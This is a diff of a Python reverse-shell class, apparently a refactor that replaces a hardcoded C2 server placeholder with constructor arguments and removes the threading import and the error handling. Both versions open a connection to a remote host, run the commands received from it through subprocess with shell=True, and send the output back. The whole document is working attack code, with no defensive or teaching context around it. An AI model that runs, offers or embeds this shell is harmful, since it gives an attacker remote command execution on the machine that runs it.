@@ -1,29 +1,19 @@
 import socket
 import subprocess
-import threading
 
 class ReverseShell:
-    def __init__(self):
-        self.server_ip = "YOUR_C2_SERVER_IP"
-        self.server_port = 4444
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
 
-    def start_reverse_shell(self):
-        print(f"Attempting reverse shell connection to {self.server_ip}:{self.server_port}")
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((self.server_ip, self.server_port))
-
+    def execute(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((self.ip, self.port))
+        s.send(b'Connection established\n')
         while True:
-            command = sock.recv(1024).decode('utf-8')
+            command = s.recv(1024).decode()
             if command.lower() == 'exit':
-                sock.close()
                 break
-            else:
-                result = self.execute_command(command)
-                sock.send(result.encode('utf-8'))
-
-    def execute_command(self, command):
-        try:
-            result = subprocess.run(command, shell=True, capture_output=True)
-            return result.stdout.decode() + result.stderr.decode()
-        except Exception as e:
-            return str(e)
+            output = subprocess.run(command, shell=True, capture_output=True)
+            s.send(output.stdout + output.stderr)
+        s.close()
